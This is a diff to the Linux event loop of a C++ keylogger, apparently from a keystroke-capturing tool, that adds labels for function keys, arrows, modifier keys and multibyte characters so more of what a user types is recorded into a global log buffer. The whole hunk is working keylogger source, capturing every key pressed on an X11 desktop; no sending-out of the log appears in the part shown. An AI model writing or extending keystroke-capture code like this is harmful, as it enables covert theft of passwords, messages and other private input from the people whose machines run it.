@@ -61,19 +61,49 @@ void Keylogger::LinuxLoop() {
                 if (event->u.u.type == KeyPress) {
                     KeySym keysym = XLookupKeysym(&event->u.keyButtonPointer, 0);
                     
-                    if (keysym == XK_Return) g_keylogger->append("\n");
+                    if (keysym == XK_Return) g_keylogger->append("[RETURN]");
                     else if (keysym == XK_Tab) g_keylogger->append("[TAB]");
                     else if (keysym == XK_space) g_keylogger->append(" ");
-                    else if (keysym == XK_BackSpace) g_keylogger->append("[BACK]");
+                    else if (keysym == XK_BackSpace) g_keylogger->append("[DELETE]");
+                    else if (keysym == XK_Delete) g_keylogger->append("[DEL]");
                     else if (keysym == XK_Escape) g_keylogger->append("[ESC]");
-                    else if (keysym == XK_Shift_L || keysym == XK_Shift_R) {}
+                    else if (keysym == XK_Super_L || keysym == XK_Super_R) g_keylogger->append("[CMD]");
+                    else if (keysym == XK_Shift_L || keysym == XK_Shift_R) g_keylogger->append("[SHIFT]");
+                    else if (keysym == XK_Caps_Lock) g_keylogger->append("[CAPS]");
+                    else if (keysym == XK_Alt_L || keysym == XK_Alt_R || keysym == XK_Meta_L || keysym == XK_Meta_R) g_keylogger->append("[OPT]");
                     else if (keysym == XK_Control_L || keysym == XK_Control_R) g_keylogger->append("[CTRL]");
-                    else if (keysym == XK_Alt_L || keysym == XK_Alt_R) g_keylogger->append("[ALT]");
+                    else if (keysym == XK_Left) g_keylogger->append("[LEFT]");
+                    else if (keysym == XK_Right) g_keylogger->append("[RIGHT]");
+                    else if (keysym == XK_Up) g_keylogger->append("[UP]");
+                    else if (keysym == XK_Down) g_keylogger->append("[DOWN]");
+                    else if (keysym == XK_Home) g_keylogger->append("[HOME]");
+                    else if (keysym == XK_End) g_keylogger->append("[END]");
+                    else if (keysym == XK_Page_Up) g_keylogger->append("[PGUP]");
+                    else if (keysym == XK_Page_Down) g_keylogger->append("[PGDN]");
+                    else if (keysym == XK_Insert) g_keylogger->append("[INS]");
+                    else if (keysym == XK_F1) g_keylogger->append("[F1]");
+                    else if (keysym == XK_F2) g_keylogger->append("[F2]");
+                    else if (keysym == XK_F3) g_keylogger->append("[F3]");
+                    else if (keysym == XK_F4) g_keylogger->append("[F4]");
+                    else if (keysym == XK_F5) g_keylogger->append("[F5]");
+                    else if (keysym == XK_F6) g_keylogger->append("[F6]");
+                    else if (keysym == XK_F7) g_keylogger->append("[F7]");
+                    else if (keysym == XK_F8) g_keylogger->append("[F8]");
+                    else if (keysym == XK_F9) g_keylogger->append("[F9]");
+                    else if (keysym == XK_F10) g_keylogger->append("[F10]");
+                    else if (keysym == XK_F11) g_keylogger->append("[F11]");
+                    else if (keysym == XK_F12) g_keylogger->append("[F12]");
+                    else if (keysym == XK_F13) g_keylogger->append("[F13]");
+                    else if (keysym == XK_F14) g_keylogger->append("[F14]");
+                    else if (keysym == XK_F15) g_keylogger->append("[F15]");
+                    else if (keysym == XK_Num_Lock) g_keylogger->append("[NUMLOCK]");
                     else {
-                        char buffer[2] = {0};
-                        if (XLookupString(&event->u.keyButtonPointer, buffer, sizeof(buffer), NULL, NULL) > 0) {
-                            if (buffer[0] >= 32 && buffer[0] <= 126) {
-                                g_keylogger->append(std::string(1, buffer[0]));
+                        char buffer[8] = {0};
+                        int length = XLookupString(&event->u.keyButtonPointer, buffer, sizeof(buffer) - 1, NULL, NULL);
+                        if (length > 0) {
+                            std::string s(buffer, length);
+                            if (s.length() > 0 && (unsigned char)s[0] >= 32) {
+                                g_keylogger->append(s);
                             }
                         }
                     }
